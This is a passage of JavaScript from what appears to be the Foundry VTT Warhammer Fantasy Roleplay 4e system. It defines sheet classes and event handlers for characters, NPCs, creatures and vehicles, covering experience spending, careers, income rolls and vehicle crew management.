    for (let log of condensed) {
      if (log.counter && log.counter > 1)
        log.reason += ` (${log.counter})`;
    }
    return condensed.reverse()
  }


  /* --------------------------------------------------------------------------------------------------------- */
  /* ------------------------------------ Event Listeners and Handlers --------------------------------------- */
  /* --------------------------------------------------------------------------------------------------------- */
  /**
   * This list of event handlers is focused on character interactions, such has spending exp and handling careers.
   * 
   *
  /* --------------------------------------------------------------------------------------------------------- */

  /**
   * Activate event listeners using the prepared sheet HTML
   * @param html {HTML}   The prepared HTML object ready to be rendered into the DOM
   */
  activateListeners(html) {
    super.activateListeners(html);

    // Career toggle click (current or complete)
    html.find('.career-toggle').click(this._onToggleCareer.bind(this));
    html.find(".add-career").click(ev => {new game.wfrp4e.apps.CareerSelector(this.actor).render(true);});
    html.find(".untrained-skill").mousedown(this._onUntrainedSkillClick.bind(this));
    html.find(".untrained-talent").mousedown(this._onUntrainedTalentClick.bind(this));
    html.find('.advancement-indicator').mousedown(this._onAdvancementClick.bind(this));
    html.find('.exp-delete').click(this._onExpLogDelete.bind(this));
    html.find("#input-status").mousedown(this._onStatusClick.bind(this));

  }

  async _onToggleCareer(ev) {
    let itemId = this._getId(ev);
    let type = $(ev.currentTarget).attr("toggle-type");
    let item = this.actor.items.get(itemId);

    // Only one career can be current - make all careers not current before changing selected one
    if (type == "current" && item.current.value == false) { 
      let updateCareers = this.actor.getItemTypes("career").map(i => i.toObject());
      updateCareers.map(x => x.system.current.value = false);
      await this.actor.updateEmbeddedDocuments("Item", updateCareers);
    }
    return item.update({[`system.${type}.value`] : !item[type].value})
  }

    // Grayed-out skill click - prompt to add the skill
  async _onUntrainedSkillClick(ev) {
    let skill = await WFRP_Utility.findSkill(event.target.text);

    // Right click - show sheet
    if (ev.button == 2) {
      skill.sheet.render(true);
    }
    else {
      try {
        new Dialog(
          {
            title: game.i18n.localize("SHEET.AddSkillTitle"),
            content: `<p>${game.i18n.localize("SHEET.AddSkillPrompt")}</p>`,
            buttons:
            {
              yes:
              {
                label: game.i18n.localize("Yes"),
                callback: dlg => {
                  this.actor.createEmbeddedDocuments("Item", [skill.toObject()]);
                }
              },
              cancel:
              {
                label: game.i18n.localize("Cancel"),
                callback: dlg => {
                  return
                }
              },
            },
            default: 'yes'
          }).render(true);
      }
      catch
      {
        console.error(error);
        ui.notifications.error(error);
      }
    }
  }

    // Grayed-out talent click - prompt to add the talent
  async _onUntrainedTalentClick(ev) {
    let talent = await WFRP_Utility.findTalent(event.target.text);

    // Right click - show sheet
    if (ev.button == 2) {
      talent.sheet.render(true);
    }

    else {
      try {
        new Dialog(
          {
            title: game.i18n.localize("SHEET.AddTalentTitle"),
            content: `<p>${game.i18n.localize("SHEET.AddTalentPrompt")}</p>`,
            buttons:
            {
              yes:
              {
                label: game.i18n.localize("Yes"),
                callback: dlg => {
                  try {
                    WFRP_Utility.checkValidAdvancement(this.actor.details.experience.total, this.actor.details.experience.spent + 100, game.i18n.localize("ACTOR.ErrorAdd"), talent.name);
                    this.actor.createEmbeddedDocuments("Item", [talent.toObject()]);
                    let expLog = foundry.utils.duplicate(this.actor.details.experience.log || []); 
                    expLog.push({amount : 100, reason : talent.name, spent : this.actor.details.experience.spent + 100, total : this.actor.details.experience.total, type : "spent"});
                    ui.notifications.notify(game.i18n.format("ACTOR.SpentExp", {amount : 100, reason : talent.name}));
                    this.actor.update( // Subtract experience if added
                      {
                        "system.details.experience.spent": this.actor.details.experience.spent + 100,
                        "system.details.experience.log": expLog
                      });
                  } catch(error) {
                    ui.notifications.error(error);
                  }
                }
              },
              yesNoExp:
              {
                label: game.i18n.localize("Free"),
                callback: dlg => { this.actor.createEmbeddedDocuments("Item", [talent.toObject()]); }
              },
              cancel:
              {
                label: game.i18n.localize("Cancel"),
                callback: dlg => { return }
              },
            },
            default: 'yes'
          }).render(true);
      }
      catch
      {
        console.error(error);
        ui.notifications(error);
      }
    }
  }

   // Advancement indicators appear next to characteristic, skills, and talents available to spend exp on
    // Left click spends exp - right click reverses
  async _onAdvancementClick(ev) {
    let data = this.actor.toObject().system;
    let type = $(ev.target).attr("data-target");

    // Skills
    if (type == "skill") {
      let itemId = this._getId(ev);
      let item = this.actor.items.get(itemId);

      if (ev.button == 0) {
        // Calculate the advancement cost based on the current number of advances, subtract that amount, advance by 1
        let cost = WFRP_Utility._calculateAdvCost(item.advances.value, type, item.advances.costModifier);
        try {
          WFRP_Utility.checkValidAdvancement(data.details.experience.total, data.details.experience.spent + cost, game.i18n.localize("ACTOR.ErrorImprove"), item.name);
          data.details.experience.spent = Number(data.details.experience.spent) + cost;
          await item.update({"system.advances.value" : item.advances.value + 1});

          let expLog = this.actor._addToExpLog(cost, item.name, data.details.experience.spent);
          ui.notifications.notify(game.i18n.format("ACTOR.SpentExp", {amount : cost, reason: item.name}));
          await this.actor.update({ "system.details.experience.spent": data.details.experience.spent, "system.details.experience.log" : expLog });
        } catch(error) {
          ui.notifications.error(error);
        }
      }
      else if (ev.button = 2) {
        // Do the reverse, calculate the advancement cost (after subtracting 1 advancement), add that exp back
        if (item.advances.value == 0)
          return;
        let cost = WFRP_Utility._calculateAdvCost(item.advances.value - 1, type, item.advances.costModifier);
        data.details.experience.spent = Number(data.details.experience.spent) - cost;
        await item.update({"system.advances.value" : item.advances.value - 1});

        let expLog = this.actor._addToExpLog(-1 * cost, item.name, data.details.experience.spent);
        ui.notifications.notify(game.i18n.format("ACTOR.SpentExp", {amount : -1 * cost, reason : item.name}));
        await this.actor.update({ "system.details.experience.spent": data.details.experience.spent, "system.details.experience.log" : expLog });
      }
    }
    // Talents
    else if (type == "talent") {
      if (ev.button == 0) {
        // All career talents are stored in flags, retrieve the one clicked - use to calculate exp
        let itemId = this._getId(ev);
        let item = this.actor.items.get(itemId);
        let advances = item.Advances;
        let spent = 0;
        let cost = (advances + 1) * 100;
        try {
          WFRP_Utility.checkValidAdvancement(this.actor.details.experience.total, this.actor.details.experience.spent + cost, game.i18n.localize("ACTOR.ErrorImprove"), item.name);
          if (advances < item.Max || item.Max == "-") {
            spent = this.actor.details.experience.spent + cost;
          }
          else
            return
          await this.actor.createEmbeddedDocuments("Item", [item.toObject()]);
          
          ui.notifications.notify(game.i18n.format("ACTOR.SpentExp", {amount : cost, reason : item.name}));
          let expLog = this.actor._addToExpLog(cost, item.name, spent);
          await this.actor.update({"system.details.experience.spent": spent, "system.details.experience.log" : expLog});
        }  catch(error) {
          ui.notifications.error(error);
        }
      }
      // If right click, ask to refund EXP or not
      else if (ev.button == 2) {
        let itemId = this._getId(ev);
        let item = this.actor.items.get(itemId);
        let advances = item.Advances;
        let spent = 0;
        let cost = (advances) * 100;
        spent = this.actor.details.experience.spent - cost;

        new Dialog(
          {
            title: game.i18n.localize("SHEET.RefundXPTitle"),
            content: `<p>${game.i18n.localize("SHEET.RefundXPPrompt")} (${(advances) * 100})</p>`,
            buttons:
            {
              yes:
              {
                label: game.i18n.localize("Yes"),
                callback: dlg => {
                  this.actor.deleteEmbeddedDocuments("Item", [itemId]);
                  let expLog = this.actor._addToExpLog(-1 * cost, item.name, spent);
                  ui.notifications.notify(game.i18n.format("ACTOR.SpentExp", {amount : -1 * cost, reason : item.name}));
                  this.actor.update({"system.details.experience.spent": spent, "system.details.experience.log" : expLog});
                }
              },
              no:
              {
                label: game.i18n.localize("No"),
                callback: dlg => {
                  this.actor.deleteEmbeddedDocuments("Item", [itemId]);
                },
              },
              cancel:
              {
                label: game.i18n.localize("Cancel"),
                callback: dlg => { return }
              }
            },
            default: 'yes'
          }).render(true);
        // Reverse the cost, add to exp, and remove the talent

      }

    }
    // Characteristics
    else {
      let characteristic = type;
      let currentChar = this.actor.characteristics[characteristic];

      if (ev.button == 0) {
        // Calculate the advancement cost based on the current number of advances, subtract that amount, advance by 1
        let cost = WFRP_Utility._calculateAdvCost(currentChar.advances, "characteristic");
        try {
          WFRP_Utility.checkValidAdvancement(data.details.experience.total, data.details.experience.spent + cost, game.i18n.localize("ACTOR.ErrorImprove"), game.wfrp4e.config.characteristics[characteristic]);
          data.characteristics[characteristic].advances++;
          data.details.experience.spent = Number(data.details.experience.spent) + cost;

          let expLog = this.actor._addToExpLog(cost, game.wfrp4e.config.characteristics[characteristic], data.details.experience.spent);
          ui.notifications.notify(game.i18n.format("ACTOR.SpentExp", {amount : cost, reason : game.wfrp4e.config.characteristics[characteristic]}));
          data.details.experience.log = expLog;

          await this.actor.update({"system.characteristics": data.characteristics,"system.details.experience": data.details.experience});
        } catch(error) {
          ui.notifications.error(error);
        }
      }
      else if (ev.button == 2) {
        // Calculate the advancement cost based on advances -1, add that amount back into exp
        if (currentChar.advances == 0)
          return
        let cost = WFRP_Utility._calculateAdvCost(currentChar.advances - 1, "characteristic");

        data.characteristics[characteristic].advances--;
        data.details.experience.spent = Number(data.details.experience.spent) - cost;

        let expLog = this.actor._addToExpLog(-1 * cost, game.wfrp4e.config.characteristics[characteristic], data.details.experience.spent);
        ui.notifications.notify(game.i18n.format("ACTOR.SpentExp", {amount : -1 * cost, reason : game.wfrp4e.config.characteristics[characteristic]}));
        data.details.experience.log = expLog;


        await this.actor.update({"system.characteristics": data.characteristics, "system.details.experience": data.details.experience});
      }
    }
  }

  _onExpLogDelete(ev) {
    let index = parseInt($(ev.currentTarget).parents(".exp-entry").attr("data-index"));
    let experience = foundry.utils.duplicate(this.actor.details.experience);
    let entry = experience.log[index];
    let exp = parseInt(entry.amount);
    let type = entry.type;
    experience.log.splice(index, 1);

    new Dialog({
      title: game.i18n.localize("RevertExperience"),
      content : `<p>${game.i18n.localize("DIALOG.RevertExperience")}</p>`,
      buttons : {
        yes : {
          label : game.i18n.localize("Yes"),
          callback : dlg => {
            experience[type] -= exp;
            this.actor.update({"system.details.experience" : experience});
          }
        },
        no : {
          label : game.i18n.localize("No"),
          callback : dlg => {this.actor.update({"system.details.experience" : experience});}
        }
      }
    }).render(true);
  }

  _onStatusClick(ev) {
    let modifier = ev.button == 0 ? 1 : -1; // Increment if left click, decrement if right click
    this.actor.update({"system.details.status.modifier" : (this.actor.details.status.modifier || 0) + modifier});
  }

}

/**
 * Provides the specific interaction handlers for NPC Sheets.
 *
 * ActorSheetWfrp4eNPC is assigned to NPC type actors, and the specific interactions
 * npc type actors need are defined here, specifically for careers. NPCs have the unique
 * functionality with careers where clicking "complete" automatically advances characteristics,
 * skills, and talents from that career.
 * 
 */
class ActorSheetWfrp4eNPC extends ActorSheetWfrp4e {
  static get defaultOptions() {
    const options = super.defaultOptions;
    foundry.utils.mergeObject(options,
      {
        classes: options.classes.concat(["wfrp4e", "actor", "npc-sheet"]),
        width: 610,
        height: 740,
      });
    return options;
  }

  /**
   * Get the correct HTML template path to use for rendering this particular sheet
   * @type {String}
   */
  get template() {
    if (!game.user.isGM && this.actor.limited) return "systems/wfrp4e/templates/actors/actor-limited.hbs";
    return "systems/wfrp4e/templates/actors/npc/npc-sheet.hbs";
  }

  /* -------------------------------------------- */
  /*  Event Listeners and Handlers
  /* -------------------------------------------- */

  /**
   * Activate event listeners using the prepared sheet HTML
   * @param html {HTML}   The prepared HTML object ready to be rendered into the DOM
   */
  activateListeners(html) {
    super.activateListeners(html);

    // Do not proceed if sheet is not editable
    if (!this.options.editable) return;

    // Roll a characteristic test by clicking on the characteristic name
    html.find('.ch-roll').click(this._onCharClick.bind(this));

    html.find(".npc-income").click(this._onNpcIncomeClick.bind(this));

    // Advance NPC if a career is marked as "complete"
    html.find('.npc-career').click(this._onNpcCareerClick.bind(this));

  }

  //TODO Review with status changes
  async _onNpcIncomeClick(event) {
    let status = this.actor.details.status.value.split(" ");
    let dieAmount = game.wfrp4e.config.earningValues[WFRP_Utility.findKey(status[0], game.wfrp4e.config.statusTiers)][0]; // b, s, or g maps to 2d10, 1d10, or 1 respectively (takes the first letter)
    dieAmount = Number(dieAmount) * status[1];     // Multilpy that first letter by your standing (Brass 4 = 8d10 pennies)
    let moneyEarned;
    if (WFRP_Utility.findKey(status[0], game.wfrp4e.config.statusTiers) != "g") // Don't roll for gold, just use standing value
    {
      dieAmount = dieAmount + "d10";
      moneyEarned = (await new Roll(dieAmount).roll()).total;
    }
    else
      moneyEarned = dieAmount;

    let paystring;
    switch (WFRP_Utility.findKey(status[0], game.wfrp4e.config.statusTiers)) {
      case "b":
        paystring = `${moneyEarned}${game.i18n.localize("MARKET.Abbrev.BP").toLowerCase()}.`;
        break;
      case "s":
        paystring = `${moneyEarned}${game.i18n.localize("MARKET.Abbrev.SS").toLowerCase()}.`;
        break;
      case "g":
        paystring = `${moneyEarned}${game.i18n.localize("MARKET.Abbrev.GC").toLowerCase()}.`;
        break;
    }
    let money = MarketWfrp4e.creditCommand(paystring, this.actor, { suppressMessage: true });
    WFRP_Audio.PlayContextAudio({ item: { type: "money" }, action: "gain" });
    this.actor.updateEmbeddedDocuments("Item", money);
  }

  async _onNpcCareerClick(event) {
    event.preventDefault();
    let id = $(event.currentTarget).parents(".item").attr("data-id");
    let careerItem = this.actor.items.get(id);
    await careerItem.update({"system.complete.value" : !careerItem.complete.value});

    if (careerItem.complete.value) {

      new Dialog({
        content: game.i18n.localize("CAREERAdvHint"),
        title: game.i18n.localize("CAREERAdv"),
        buttons: {
          yes: {
            label: game.i18n.localize("Yes"),
            callback: async () => {

              await this.actor.advanceNPC(careerItem);
              await this.actor.update({ "system.details.status.value": game.wfrp4e.config.statusTiers[careerItem.status.tier] + " " + careerItem.status.standing });
            }
          },
          no: {
            label: game.i18n.localize("No"),
            callback: () => { }
          }
        }
      }).render(true);
    }
  }
}

/**
 * Provides the specific interaction handlers for Creature Sheets.
 *
 * ActorSheetWfrp4eCreature is assigned to Creature type actors, which have a very 
 * different layout in their sheet compared to the others, requiring different 
 * functionality in the main tab (creature overview), as well as the notes tab, 
 * where the user excludes traits.
 * 
 */
class ActorSheetWfrp4eCreature extends ActorSheetWfrp4e {


  // V10 - Dialogs need focus for default button to work with the Enter key. Hovering over traits in the overview focuses on them (required for delete key to work)
  // This variable prevents focusing on these if a dialog is open, so that Enter will work with dialogs
  dialogOpen = false 

  static get defaultOptions() {
    const options = super.defaultOptions;
    foundry.utils.mergeObject(options,
      {
        classes: options.classes.concat(["wfrp4e", "actor", "creature-sheet"]),
        width: 610,
        height: 740,
      });
    return options;
  }


  /**
   * Get the correct HTML template path to use for rendering this particular sheet
   * @type {String}
   */
  get template() {
    if (!game.user.isGM && this.actor.limited) return "systems/wfrp4e/templates/actors/actor-limited.hbs";
    return "systems/wfrp4e/templates/actors/creature/creature-sheet.hbs";
  }


  async getData() { 
    const sheetData = await super.getData();

    this.addCreatureData(sheetData);

    
    sheetData.manualScripts = this.actor.items.contents
    .filter(i => i.included)
    .reduce((scripts, item) => 
      scripts.concat(item.manualScripts
        .filter(script => !scripts
          .find(s => s.label == script.label))), []);  // Reduce all the scripts into a single array, but ignore duplicates (same label) perhaps a kludge fix for multiple talents on creatures (Combat Aware)

    return sheetData;
  }

  addCreatureData(sheetData) {
    sheetData.items.skills.trained = sheetData.actor.getItemTypes("skill").filter(i => i.advances.value > 0).sort((a, b) => a.name > b.name ? 1 : -1);
    sheetData.items.includedTraits = sheetData.items.traits.filter(i => i.included).sort((a, b) => a.name > b.name ? 1 : -1);
  }



  /**
   * Prevents a dropdown event from immediately firing - allows for double clicking items
   * in the creature overview to open the sheet.
   * 
   * @param {Object} event    event fired by clicking on a dropdown element 
   */
  _delayedDropdown(event) {

    // count clicks
    if (this.clicks)
      this.clicks++;
    else
      this.clicks = 1;

    // If first click, set a timeout value, and if it expires, reset clicks and show dropdown
    if (this.clicks === 1) {
      this.timer = setTimeout(() => {
        this._onCreatureItemSummary(event);
        this.clicks = 0; //after action performed, reset counter
      }, 250);
    } // If the timeout does not expire before another click, open the item sheet
    else {
      clearTimeout(this.timer); //prevent single-click action
      let itemId = $(event.currentTarget).attr("data-id");
      const item = this.actor.items.get(itemId);
      item.sheet.render(true);
      this.clicks = 0; //after action performed, reset counter
    }
  }

  /**
   * Handles when the user clicks on a trait in the creature overview - shows the item summary
   * as dropdown info
   * 
   * TODO: Reuse onItemSummary instead of this
   * @param {Object} event    event fired from clicking on an item
   */
  async _onCreatureItemSummary(event) {
    event.preventDefault();
    let li = $(event.currentTarget).parent('.list'),
      item = this.actor.items.get($(event.currentTarget).attr("data-id")),
      // Get expansion info to place in the dropdown
      expandData = await item.system.expandData(
        {
          secrets: this.actor.isOwner
        });


    // If already has expanded class, remove it
    if (li.hasClass("expanded")) {
      let summary = li.children(".item-summary");
      summary.slideUp(200, () => summary.remove());
    }
    else {
      let div = "";
      div = $(`<div class="item-summary"><b>${item.name}:</b>${expandData.description.value}</div>`);

      let props = $(`<div class="item-properties"></div>`);
      expandData.properties.forEach(p => props.append(`<span class="tag">${p}</span>`));
      div.append(props);
      if (expandData.manualScripts.length) {
        let scriptButtons = expandData.manualScripts.map((s, i) => `<a class="trigger-script" data-index=${s.index} data-uuid=${s.effect?.uuid}>${s.Label}</a>`);
        let scripts = $(`<div>${scriptButtons}</div>`);
        div.append(scripts);
      }

      if (expandData.independentEffects.length)
      {
        let effectButtons = ``;
        for(let effect of expandData.independentEffects)
        {
          if (effect.isTargetApplied)
          {
            effectButtons += `<a class="apply-target-effect" data-uuid=${effect.uuid}><i class="fa-solid fa-crosshairs"></i> ${effect.name}</a>`;
          }
          else if (effect.isAreaApplied)
          {
            effectButtons += `<a class="place-area-effect" data-uuid=${effect.uuid}><i class="fa-solid fa-ruler-combined"></i> ${effect.name}</a>`;
          }
        }
        div.append(`<div>${effectButtons}</div>`);
      }


      li.append(div.hide());
      div.slideDown(200);

      this._dropdownListeners(div);

    }
    li.toggleClass("expanded");
  }


  /* -------------------------------------------- */
  /*  Event Listeners and Handlers
  /* -------------------------------------------- */

  /**
   * Activate event listeners using the prepared sheet HTML
   * @param html {HTML}   The prepared HTML object ready to be rendered into the DOM
   */
  activateListeners(html) {
    super.activateListeners(html);

    // // div elementns need focus for the DEL key to work on them
      html.find(".content").hover(event => {
        if (!this.dialogOpen)
          $(event.currentTarget).focus();
      });

    // Can use the delete key in the creature overview to delete items
    html.find('.content').keydown(this._onContentClick.bind(this));

    // // Use delayed dropdown to allow for double clicks
    html.find(".creature-dropdown").mousedown(event => {
      this._delayedDropdown(event);
    })
      .on("dblclick", function (e) {
        e.preventDefault(); //cancel system double-click event
      });

    if (!this.options.editable) return;

    // Allow for holding shift or crtl on a skill when clicking on the main tab to advance it by 10 or 1
    html.find(".skills.name, .skills.total").mousedown(this._onCreatureSkillClick.bind(this));

    // Show a dropdown for the trait, or prompt to roll for it, depending on context
    // Right click will always display dropdown, left click will sometimes display (if the trait isn't rollable)
    html.find(".traits.content").mousedown(this._onTraitClick.bind(this));

    // Click on characteristic header to roll characteristic
    html.find('.ch-roll').click(this._onCharClick.bind(this));

    // Handler for traits in the notes tab - excluding or not excluding them
    html.find('.trait-include').mousedown(this._onTraitNameClick.bind(this));

  }

   _onContentClick(ev) {
     if (ev.keyCode == 46) {
      ev.preventDefault();
      ev.stopPropagation();
      let itemId = $(ev.currentTarget).attr("data-id");
      if (itemId)
        return this.actor.deleteEmbeddedDocuments("Item", [itemId]);
    }
  }

  _onCreatureSkillClick(event) {
    let newAdv;
    let advAmt;
    let skill = this.actor.items.get($(event.currentTarget).parents(".content").attr("data-id"));

    if (event.shiftKey || event.ctrlKey) {
      if (event.shiftKey)
        advAmt = 10;
      else if (event.ctrlKey)
        advAmt = 1;
    }

    // Add if left click
    if (event.button == 0) {
      if (advAmt) {
        skill.update({"system.advances.value" : newAdv});
      }
      else // If neither control or shift was held, roll the skill instead
        this.actor.setupSkill(skill).then(setupData => {
          this.actor.basicTest(setupData);
        });    }
    // Subtract if right click
    else if (event.button == 2) {
      if (advAmt) {
        newAdv = skill.system.advances.value - advAmt;
        if (newAdv < 0)
          newAdv = 0;
        skill.update({"system.advances.value" : newAdv});

      }
      else // If neither control or shift was held, show the item sheet
      {
        skill.sheet.render(true);
      }
    }
  }

  _onTraitClick(event) {
    event.preventDefault();
    this.dialogOpen = true;
    let trait = this.actor.items.get($(event.currentTarget).attr("data-id"));

    // If rightclick or not rollable, show dropdown
    if (event.button == 2 || !trait.rollable.value) {
      this._delayedDropdown(event);
      return;
    }

    // Otherwise, prompt to roll
    this.actor.setupTrait(trait).then(testData => {
      this.actor.traitTest(testData);
    }).finally(() => {
      this.dialogOpen = false; 
    });
  }

  _onTraitNameClick(event) {
    event.preventDefault();
    let traitId = $(event.currentTarget).parents(".item").attr("data-id");
    
    if (event.button == 0) {
      let item = this.actor.items.get(traitId);
      item.update({"system.disabled" : !item.system.disabled});
    }
    // If right click, show description
    else if (event.button == 2) {
      this._onItemSummary(event);
    }
  }
}

class VehicleCrew extends FormApplication {
    static get defaultOptions() {
        const options = super.defaultOptions;
        options.classes.push("vehicle-crew");
        options.template = "systems/wfrp4e/templates/apps/vehicle-crew.hbs";
        options.resizable = true;
        options.submitOnChange = true;
        options.height = 500;
        options.width = 400;
        options.title = game.i18n.localize("VEHICLE.VehicleCrew");
        return options;
    }

    getData() {
        let data = super.getData();
        data.system = this.object.system;
        data.roles = this.object.itemTypes.vehicleRole;
        data.passengers = data.system.passengers.list;
        return data
    }

    async _updateObject(event, formData) {
        this.object.update(formData);
    }

    activateListeners(html)
    {
        super.activateListeners(html);

        let dragDrop = new DragDrop(
            {dragSelector : '.role', dropSelector : ".passenger-roles", callbacks: {
                dragstart : this._dragRole.bind(this),
                drop : this._dropRole.bind(this)
            }});

        dragDrop.bind(html[0]);

        html.find(".add-role").click(async ev => {
            await this.object.createEmbeddedDocuments("Item", [{name : game.i18n.localize("VEHICLE.NewRole"), type : "vehicleRole"}], {renderSheet: true});
            this.render(true);
        });

        html.find(".role").contextmenu(async ev => {
            this.object.items.get(ev.currentTarget.dataset.id)?.sheet?.render(true);
        });

        html.find(".delete-role").click(async ev => {
            ev.stopPropagation();
            await this.object.items.get(ev.currentTarget.parentElement.dataset.id)?.delete();
            this.render(true);
        });

        html.find(".unassign-role").click(async ev => {
            let passengerId = $(ev.currentTarget).parents(".passenger-roles").attr("data-id");
            let roleId = ev.currentTarget.dataset.id;

            await this.object.update({"system.passengers.list" : this.object.system.passengers.removeRole(passengerId, roleId)});
            this.render(true);
        });

    }

     _dragRole(ev)
     {
        ev.dataTransfer.setData("text/plain", ev.target.dataset.id);
     }

     async _dropRole(ev)
     {
        let roleId = ev.dataTransfer.getData("text/plain");
        let passengerId = ev.target.dataset.id;

        await this.object.update({"system.passengers.list" : this.object.system.passengers.addRole(passengerId, roleId)});
        this.render(true);
     }


}

class VehicleCumulativeModifiersConfig extends FormApplication {
    static get defaultOptions() {
        const options = super.defaultOptions;
        options.classes.push("vehicle-modifiers");
        options.template = "systems/wfrp4e/templates/apps/vehicle-modifiers.hbs";
        options.width = 600;
        options.resizable = true;
        return options;
    }

    get title()
    {
        return this.key == "morale" ? game.i18n.localize("VEHICLE.VehicleMorale") : game.i18n.localize("VEHICLE.ManannsMood")
    }

    get key ()
    {
        return this.options.key;
    }

    getData() {
        if (game.modules.get("foundryvtt-simple-calendar")?.active) 
        {
            this.options.weekLabel = SimpleCalendar.api.currentDateTimeDisplay()?.date;
        }
        let data = super.getData();
        data.roll = this.options.roll;
        data.system = this.object.system;
        data.sources = data.system.status[this.key].sources;
        data.starting = data.system.status[this.key].starting;

        return data
    }

    async _updateObject(event, formData) {
        this.object.update(formData);
    }

    close() 
    {
        this.object.update({[`system.status.${this.key}.sources`] : this.object.system.status[this.key].sources.filter(i => i.description)});
        super.close();
    }

    activateListeners(html)
    {
        super.activateListeners(html);


        html.find(".starting").change(async ev => {
            await this.object.update({[`system.status.${this.key}.starting`] : Number(ev.target.value)});
            this.render(true);
        });

        html.find(".sources input").change(async ev => {
            let index = Number(ev.currentTarget.parentElement.dataset.index);
            let sources = foundry.utils.deepClone(this.object.system.status[this.key].sources);

            if (ev.currentTarget.type == "checkbox")
            {
                sources[index].active = !sources[index].active;                
            }
            else 
            {
                sources[index][ev.currentTarget.name] = ev.currentTarget.value;
            }
            await this.object.update({[`system.status.${this.key}.sources`] : sources.filter(i => i.description)});
            this.render(true);
        });

        html.find(".set-value").change(ev => {
            this.options.setValue = Number(ev.target.value) || null;
        });

        html.find(".roll").click(ev => {
            if (!this.options.weekLabel)
            {
                ui.notifications.error(game.i18n.localize("VEHICLE.LabelError"));
            }
            else 
            {
                if (this.options.setValue)
                {
                    this.object.system.status[this.key].setValue(this.options.weekLabel, this.options.setValue);
                }
                else 
                {
                    this.object.system.status[this.key].roll(this.options.weekLabel);
                }
                this.close();
            }
        });

        html.find(".week-label").change(ev => {
            this.options.weekLabel = ev.target.value;
        });

        html.find(".add").click(async ev => {
            let sources = foundry.utils.deepClone(this.object.system.status[this.key].sources);
            sources.push({description : "", formula : "", active : false});
            await this.object.update({[`system.status.${this.key}.sources`] : sources});
            this.render(true);
        });

        html.find(".remove").click(async ev => {
            let index = Number(ev.currentTarget.parentElement.dataset.index);
            let sources = foundry.utils.deepClone(this.object.system.status[this.key].sources);
            sources.splice(index, 1);
            await this.object.update({[`system.status.${this.key}.sources`] : sources});
            this.render(true);
        });
    }
}

class VehicleMoveConfig extends FormApplication {
    static get defaultOptions() {
        const options = super.defaultOptions;
        options.classes.push("vehicle-move");
        options.template = "systems/wfrp4e/templates/apps/vehicle-move.hbs";
        options.height = "auto";
        options.width = 600;
        options.minimizable = true;
        options.title = game.i18n.localize("VEHICLE.Move");
        return options;
    }

    getData() {
        let data = super.getData();
        data.system = this.object.system;
        return data
    }

    async _updateObject(event, formData) {
        if (formData.sailPrimary)
        {
            formData["system.details.move.primary"] = "sail";
            delete formData.sailPrimary;
        }
        else if (formData.oarsPrimary)
        {
            formData["system.details.move.primary"] = "oars";
            delete formData.oarsPrimary;
        }
        this.object.update(formData);
    }

    activateListeners(html)
    {
        super.activateListeners(html);

        this.sailSection = html.find(".sail")[0];
        this.oarsSection = html.find(".oars")[0];

        this.sailEnable = html.find("[name='system.details.move.sail.enabled'")[0];
        this.oarsEnable = html.find("[name='system.details.move.oars.enabled'")[0];

        this.sailPrimary = html.find("[name='sailPrimary']")[0];
        this.oarsPrimary = html.find("[name='oarsPrimary']")[0];

        html.find(".enableToggle").change(ev => {
            this.checkToggles();
        });

        html.find(".primaryToggle").change(ev => {
            if (ev.target.name == "sailPrimary" && ev.target.checked)
            {
                this.oarsPrimary.checked = false;
            }
            else if (ev.target.name == "oarsPrimary" && ev.target.checked)
            {
                this.sailPrimary.checked = false;
            }
        });
        
        this.checkToggles();
    }

    checkToggles()
    {
        if (this.sailEnable.checked && this.sailSection.classList.contains("disabled"))
        {
            this.sailSection.classList.remove("disabled");
        }
        if (!this.sailEnable.checked && !this.sailSection.classList.contains("disabled"))
        {
            this.sailSection.classList.add("disabled");
            this.sailPrimary.checked = false;
        }

        if (this.oarsEnable.checked && this.oarsSection.classList.contains("disabled"))
        {
            this.oarsSection.classList.remove("disabled");
        }
        if (!this.oarsEnable.checked && !this.oarsSection.classList.contains("disabled"))
        {
            this.oarsSection.classList.add("disabled");
            this.oarsPrimary.checked = false;
        }
    }
}

/**
 * Provides the specific interaction handlers for Vehicle Sheets.
 *
 */
class ActorSheetWfrp4eVehicle extends ActorSheetWfrp4e {
  static get defaultOptions() {
    const options = super.defaultOptions;
    foundry.utils.mergeObject(options,
      {
        classes: options.classes.concat(["wfrp4e", "actor", "vehicle-sheet"]),
        width: 610,
        height: 740,
        dragDrop: [{ dragSelector: ".item-list .item", dropSelector: null }, { dragSelector: ".actor-list .actor", dropSelector: null }]
      });
    return options;
  }

  async _onDrop(event) {
    let dragData = JSON.parse(event.dataTransfer.getData("text/plain"));

    if (dragData?.type == "Actor")
    {
      if (dragData.uuid.includes("Compendium"))
      {
        return ui.notification.error("Cannot use Compendium Actors with Vehicles")
      }
      this.actor.update({ "system.passengers.list": this.actor.system.passengers.add(fromUuidSync(dragData.uuid)) });
    }
    else return super._onDrop(event);
  }

    /**
   * Get the correct HTML template path to use for rendering this particular sheet
   * @type {String}
   */
  get template() {
    if (!game.user.isGM && this.actor.limited) return "systems/wfrp4e/templates/actors/actor-limited.hbs";
    return "systems/wfrp4e/templates/actors/vehicle/vehicle-sheet.hbs";
  }



  async getData() {
    let sheetData = await super.getData();
    sheetData.system.crew = foundry.utils.deepClone(sheetData.system.crew);
    sheetData.system.crew.forEach(c => c.rolesDisplay = c.roles.map(i => `<a class="role-click" data-role-id="${i.id}">${i.name}</a>`).join(", "));
    // sheetData.system.roles.forEach(r => {
    //   if (r.actor) {
    //     r.img = game.actors.get(r.actor)?.prototypeToken.texture.src
      // }
    // })

    return sheetData;
  }

  async _handleEnrichment()
  {
      let enrichment = {};
      enrichment["system.details.description.value"] = await TextEditor.enrichHTML(this.actor.system.details.description.value, {async: true});
      enrichment["system.details.gmdescription.value"] = await TextEditor.enrichHTML(this.actor.system.details.gmdescription.value, {async: true});

      return foundry.utils.expandObject(enrichment)
  }


  _addEncumbranceData(sheetData)
  {
    sheetData.system.status.encumbrance.max = sheetData.system.status.carries.max;
    sheetData.system.status.encumbrance.pct = sheetData.system.status.encumbrance.over / sheetData.system.status.encumbrance.max * 100;
    sheetData.system.status.encumbrance.carryPct = sheetData.system.status.encumbrance.current / sheetData.system.status.carries.max * 100;
    if (sheetData.system.status.encumbrance.pct + sheetData.system.status.encumbrance.carryPct > 100) {
      sheetData.system.status.encumbrance.penalty = Math.floor(((sheetData.system.status.encumbrance.carryPct + sheetData.system.status.encumbrance.pct) - 100) / 10);
      sheetData.system.status.encumbrance.message = game.i18n.format("VEHICLE.HandlingPenalty", { penalty: sheetData.system.status.encumbrance.penalty });
      sheetData.system.status.encumbrance.overEncumbered = true;
    }
    else {
